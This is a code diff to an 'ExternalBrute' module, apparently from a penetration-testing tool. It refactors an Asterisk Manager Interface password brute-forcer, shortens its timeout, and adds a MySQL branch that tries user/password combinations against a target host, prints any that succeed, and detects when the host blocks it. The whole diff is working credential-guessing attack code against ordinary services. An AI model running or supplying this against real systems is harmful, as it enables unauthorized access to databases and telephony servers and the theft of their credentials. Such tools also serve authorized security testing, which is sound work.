@@ -37,7 +37,7 @@ class ExternalBrute extends EventEmitter
 
 	@emitter = new EventEmitter
 	# Time to wait for a response.
-	timeOut = 2000
+	timeOut = 1000
 	
 	printBrutePass = (user, pass) ->
 		Printer.info "\nPassword found (user "
@@ -45,32 +45,58 @@ class ExternalBrute extends EventEmitter
 		Printer.info "): "
 		Printer.result "#{pass}\n"
 
-	oneBrute = (target, port, testUser, testPass, type) ->
-        isValid = true
-        isConnected = false
+	oneBrute = (target, port, testUser, testPass, type) ->			
+		switch type
+			when "ami"
+				isValid = true
+				isConnected = false
+				callback = () =>
+					if (isValid and isConnected)
+						printBrutePass testUser, testPass
 
-        callback = () =>
-            if (isValid and isConnected)
-                printBrutePass testUser, testPass
+				setTimeout callback, timeOut
+				ami = require("asterisk-manager")(port, target, testUser, testPass, true)
+				# Listen for specific AMI events.
+				ami.on "end", (evt) ->
+					isValid = false
+					Printer.highlight "Last tested combination "
+					Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
+					Printer.removeCursor()
 
-        setTimeout callback, timeOut
-        ami = require("asterisk-manager")(port, target, testUser, testPass, true)
-        
-        # Listen for specific AMI events.
-        ami.on "end", (evt) ->
-            isValid = false
-            Printer.highlight "Last tested combination "
-            Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
-            Printer.removeCursor()
+				ami.on "connect", () ->
+					isConnected = true
 
-        ami.on "connect", () ->
-        	isConnected = true
-            
-        ami.on "error", (evt) ->
-        	isValid = false
-        	Printer.error "ExternalBrute: Connection problem: #{evt}"
-            
-            
+				ami.on "error", (evt) =>
+					isValid = false
+					Printer.error "ExternalBrute: Connection problem: #{evt}"
+			when "mysql"
+				isUP = true
+				mysql = require "mysql"
+				mysqlO =
+					host: target
+					port: port
+					user: testUser
+					password: testPass
+
+				connection = mysql.createConnection mysqlO
+
+				if isUP
+					connection.connect (err) ->
+						if err
+							if /ER_ACCESS_DENIED_ERROR/.exec err
+								Printer.highlight "Last tested combination "
+								Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
+								Printer.removeCursor()
+							else
+								if /ER_HOST_IS_BLOCKED/.exec err
+									Printer.error "You've been blocked, quitting module..."
+									return
+								else
+									Printer.error "ExternalBrute: Connection problem #{err}"
+						else
+							connection.end()
+							printBrutePass testUser, testPass
+
 	brute = (target, port, testUser, passwords, delay, type) =>
 		# File with passwords is provided.
 		if (Grammar.fileRE.exec passwords)
